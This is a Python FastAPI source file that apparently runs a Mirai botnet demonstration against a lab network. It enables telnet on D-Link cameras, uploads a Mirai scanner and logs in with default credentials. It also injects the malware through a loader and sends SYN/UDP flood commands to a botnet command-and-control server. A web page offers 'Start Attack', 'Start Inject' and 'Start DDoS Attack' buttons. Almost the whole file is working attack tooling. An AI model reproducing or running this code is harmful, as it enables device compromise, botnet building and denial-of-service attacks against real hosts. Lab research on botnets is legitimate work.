from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import asyncio
import telnetlib
import subprocess
import queue
import threading
from fastapi import FastAPI, HTTPException, Query
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
app = FastAPI()


app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Allows all origins, you can limit it to specific domains like ["http://example.com"]
    allow_credentials=True,
    allow_methods=["*"],  # Allows all HTTP methods (GET, POST, PUT, DELETE, etc.)
    allow_headers=["*"],  # Allows all headers
)

# WebSocket client management
clients_by_endpoint = {
    "attack": set(),
    "inject": set(),
    "ddos": set(),
}
output_queues = {
    "attack": queue.Queue(),
    "inject": queue.Queue(),
    "ddos": queue.Queue(),
}

def parse_ddos_parameters(data):
    """
    Parse the parameters for a DDoS command.
    Expects a JSON-formatted string with keys: 'type', 'duration', and 'target'.
    """
    import json
    try:
        params = json.loads(data)
        required_keys = {"type", "duration", "target"}
        if not required_keys.issubset(params.keys()):
            raise ValueError(f"Missing required keys: {required_keys - params.keys()}")
        return params
    except Exception as e:
        raise ValueError(f"Invalid parameters: {e}")
    
@app.get("/ddos")
async def ddos_attack(type: str = Query(...), duration: int = Query(...), target: str = Query(...)):
    """
    This endpoint handles DDoS attack requests.
    Expects three parameters: type, duration, and target.
    """
    try:
        # # Validate parameters
        # if type not in ["SYN flood", "UDP flood", "TCP flood"]:
        #     raise HTTPException(status_code=400, detail="Invalid attack type specified.")
        
        if duration <= 0:
            raise HTTPException(status_code=400, detail="Duration must be a positive integer.")

        # Call the DDoS handler with the given parameters
        attack_message = threading.Thread(target=handle_ddos_telnet, args=(type, duration, target))
        attack_message.start()        
        return JSONResponse(content={"message": f"Started DDoS attack of type {type} on {target} for {duration} seconds."}, status_code=200)
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error initiating DDoS attack: {str(e)}")


@app.websocket("/ws/{endpoint}")
async def websocket_endpoint(websocket: WebSocket, endpoint: str):
    """
    WebSocket endpoint for different tasks (e.g., attack, inject, ddos).
    """
    if endpoint not in clients_by_endpoint:
        await websocket.close(code=1003)  # Unsupported endpoint
        return

    await websocket.accept()
    clients_by_endpoint[endpoint].add(websocket)
    print(f"WebSocket client connected to /ws/{endpoint}")

    if endpoint == "attack":
        threading.Thread(target=handle_telnet_connection, args=(endpoint,), daemon=True).start()
    elif endpoint == "inject":
        threading.Thread(target=handle_inject_execution, args=(endpoint,), daemon=True).start()
    # elif endpoint == "ddos":

    #     try:
    #         data = await websocket.receive_text()
    #         params = parse_ddos_parameters(data)
    #         print(f"Received parameters for /ddos: {params}")
            
    #         threading.Thread(
    #             target=handle_ddos_telnet,
    #             args=(endpoint, params['type'], params['duration'], params['target']),
    #             daemon=True
    #         ).start()
    #     except Exception as e:
    #         print(f"Error receiving /ddos parameters: {e}")
    #         await websocket.close(code=1003)
    #         return


    try:
        while True:
            # Send messages from the output queue to the connected client
            if not output_queues[endpoint].empty():
                message = output_queues[endpoint].get()
                await websocket.send_text(message)
            await asyncio.sleep(0.1)
    except WebSocketDisconnect:
        print(f"WebSocket client disconnected from /ws/{endpoint}")
        clients_by_endpoint[endpoint].remove(websocket)


from telnet_util import enable_telnet, upload_file_to_dlink_cam

MIRAI_SCAN_BIN = "mirai-scan.mpsl"
# means 10.10.10.6
FIRST_VICTIM_HOST = 6
# means 10.10.10.23
SECOND_VICTIM_HOST = 23
#will enable telnet and upload scan binary
#wil also enable telnet on the second host because else scanning wont work
def prepare_hosts_for_scanning():

    status_code = enable_telnet(FIRST_VICTIM_HOST)
    if status_code != 200:
        # failed to enable telnet
        print(f"failed to enable telnet, make sure host x.x.x.{FIRST_VICTIM_HOST} is up and running")
        exit(1)

    status_code = enable_telnet(SECOND_VICTIM_HOST)
    if status_code != 200:
        # failed to enable telnet
        print(f"failed to enable telnet, make sure host x.x.x.{SECOND_VICTIM_HOST} is up and running")
        exit(1)
    
    status_code = upload_file_to_dlink_cam(FIRST_VICTIM_HOST, MIRAI_SCAN_BIN)
    if status_code != 200:
        print(f"failed to upload {MIRAI_SCAN_BIN}, make sure host x.x.x.{FIRST_VICTIM_HOST} is up and telnet is enabled!")
        exit(1)

    return 0

import re

def handle_telnet_connection(endpoint):
    """
    Handles the Telnet connection for the 'Attack' command.
    """

    print("[handle_telnet_connection]")

    succes_flag = prepare_hosts_for_scanning()

    if succes_flag == 0:
        output_queues[endpoint].put(f"Uploaded {MIRAI_SCAN_BIN} to host: .{FIRST_VICTIM_HOST}")
    else:
        output_queues[endpoint].put(f"Failed to upload {MIRAI_SCAN_BIN} to host: .{FIRST_VICTIM_HOST}")


    

    telnet_host = "10.10.10.6"
    telnet_port = 23
    username = "admin"
    password = "1234"

    try:
        with telnetlib.Telnet(telnet_host, telnet_port, timeout=10) as tn:
            tn.read_until(b"login: ")
            tn.write(username.encode('utf-8') + b"\n")
            tn.read_until(b"Password: ")
            tn.write(password.encode('utf-8') + b"\n")

            tn.write(b"./mirai-scan.mpsl\n")

            patterns = [
                r"Attempting to brute found IP (\d{1,3}(?:\.\d{1,3}){3})",  # Extract IP from brute attempt
                r"Found verified working telnet",                         # Match working telnet
                r"Send scan result to loader",                            # Match scan result
            ]

            while True:
                output = tn.read_very_eager().decode('utf-8', errors='ignore')
                if output:
                    #print(f"Telnet output for {endpoint}: {output}")

                    # Check if the output matches any of the patterns
                    for pattern in patterns:
                        match = re.search(pattern, output)
                        if match:
                            if "IP" in pattern:  # Example: Capture the IP address in the brute attempt
                                ip = match.group(1)
                                filtered_message = f"Scanning: {ip}"
                                output_queues[endpoint].put(filtered_message)
                            else:
                                # Directly send the matched pattern
                                output_queues[endpoint].put(match.group(0))

                if tn.eof:
                    print(f"Telnet session for {endpoint} closed.")
                    break

    except Exception as e:
        error_message = f"Error during Telnet connection for {endpoint}: {e}"
        print(error_message)
        output_queues[endpoint].put(error_message)


def handle_inject_execution(endpoint):
    """
    inject mirai using loader   
    """
    command = "cat dlink.txt | ./loader.dbg"
    try:
        process = subprocess.Popen(
            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        while True:
            stdout_line = process.stdout.readline()
            if stdout_line:
                decoded_output = stdout_line.decode('utf-8', errors='ignore').strip()
                print(f"Inject output: {decoded_output}")

                if "Succesfully ran payload" in decoded_output:
                    output_queues[endpoint].put("Successfully injected malware" )

            if process.poll() is not None and process.stdout.closed:
                break

    except Exception as e:
        error_message = f"Error during Inject execution: {e}"
        print(error_message)
        output_queues[endpoint].put(error_message)

import time
def handle_ddos_telnet(type, duration, target):
    """
    Handles the Telnet session for the 'DDOS' command.
    """
    telnet_host = "localhost"
    telnet_port = 23
    username = "admin"
    password = "admin"

    with telnetlib.Telnet(telnet_host, telnet_port, timeout=20) as tn:
        print("Connected to cnc!")
        initial_output = tn.read_very_eager()
        print(initial_output)
        tn.write(b"\n")
        time.sleep(1)
        #tn.read_until("пользователь: ".encode('utf-8'))
        tn.write(username.encode('utf-8') + b"\n")
        time.sleep(1)
        #tn.read_until("пароль: ".encode('utf-8'))
        tn.write(password.encode('utf-8') + b"\n")
        print("Wrote username and pw")

        while True:
            output = tn.read_very_eager().decode('utf-8', errors='ignore')
            #print(f"DDOS Telnet output: {output}")
            if "admin@botnet#" in output:
                print("We can write attack message")
                command = f"{type} {target} {duration}\n"
                tn.write(command.encode('utf-8'))
                print(f"Wrote: {command}")
                break
    return "DDoS attack started successfully!"

@app.on_event("startup")
async def background_tasks():
    """
    Starts background tasks for processing output queues.
    """
    for endpoint in clients_by_endpoint:
        asyncio.create_task(process_output_queue(endpoint))


async def process_output_queue(endpoint):
    """
    Continuously processes the output queue for a specific endpoint.
    """
    while True:
        if not output_queues[endpoint].empty():
            message = output_queues[endpoint].get()
            # Broadcast the message to all connected WebSocket clients
            await broadcast_to_clients(endpoint, message)
        await asyncio.sleep(0.1)


async def broadcast_to_clients(endpoint, message):
    """
    Sends a message to all WebSocket clients subscribed to a specific endpoint.
    """
    clients = clients_by_endpoint.get(endpoint, set())
    if clients:
        for client in clients:
            try:
                await client.send_text(message)
            except Exception as e:
                print(f"Error sending message to {endpoint} client: {e}")
                clients.remove(client)
    else:
        print(f"No clients connected to /ws/{endpoint}")

@app.get("/")
async def get():
    """
    Serve a simple HTML page for testing.
    """
    html = """
    <!DOCTYPE html>
    <html>
        <head>
            <title>DDOS Attack Test</title>
        </head>
        <body>
            <h1>DDOS Attack Test</h1>
            
            <!-- Buttons for testing -->
            <button onclick="connect('attack')">Start Attack</button>
            <button onclick="connect('inject')">Start Inject</button>
            <button onclick="connectToDdos()">Start DDoS Attack</button>
            
            <!-- Script for HTTP request to start DDoS -->
            <script>
                function connect(endpoint) {
                    console.log(`Selected endpoint: /${endpoint}`);
                    // Replace this with actual logic for handling the attack and inject
                    alert("Attack endpoint functionality is not yet implemented.");
                }

                function connectToDdos() {
                    const type = prompt("Enter attack type (e.g., SYN flood):", "SYN flood");
                    const duration = prompt("Enter duration (in seconds):", "120");
                    const target = prompt("Enter target IP address (e.g., 10.10.10.20):", "10.10.10.20");
                    
                    // Make HTTP GET request to start DDoS
                    const url = `/ddos?type=${encodeURIComponent(type)}&duration=${encodeURIComponent(duration)}&target=${encodeURIComponent(target)}`;
                    
                    fetch(url)
                        .then(response => response.json())
                        .then(data => {
                            console.log("DDoS attack started:", data);
                            alert(data.message);  // Show the confirmation message to the user
                        })
                        .catch(error => {
                            console.error("Error starting DDoS attack:", error);
                            alert("Failed to start DDoS attack. Check the console for errors.");
                        });
                }
            </script>
        </body>
    </html>
    """
    return HTMLResponse(content=html)